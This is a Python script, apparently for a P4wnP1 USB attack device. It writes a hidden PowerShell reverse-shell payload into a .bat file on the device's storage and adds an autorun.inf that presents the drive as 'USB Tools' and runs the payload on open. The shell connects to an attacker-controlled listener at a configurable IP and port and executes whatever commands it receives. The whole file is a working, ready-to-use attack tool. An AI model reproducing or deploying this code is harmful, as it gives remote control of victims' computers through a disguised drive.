#!/usr/bin/env python3
import os
from pathlib import Path

def main():
    lhost = os.getenv("P4WN_LHOST", "192.168.1.133")
    lport = os.getenv("P4WN_LPORT", "4444")
    msd_root = Path("/mnt/p4wnp1_msd")  # Adapt if different

    # Windows executable that will trigger the reverse shell
    bash_payload = f"""powershell -nop -w hidden -c "$client=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();" """

    exe_path = msd_root / "reverse_shell.bat"
    autorun_path = msd_root / "autorun.inf"

    with open(exe_path, "w") as f:
        f.write(bash_payload)
    print(f"[+] Wrote payload to {exe_path}")

    autorun_inf = f"""
[AutoRun]
label=USB Tools
icon=shell32.dll,4
open=reverse_shell.bat
action=Start reverse shell
""".strip()

    with open(autorun_path, "w") as f:
        f.write(autorun_inf)
    print(f"[+] Wrote autorun.inf to {autorun_path}")

if __name__ == "__main__":
    main()
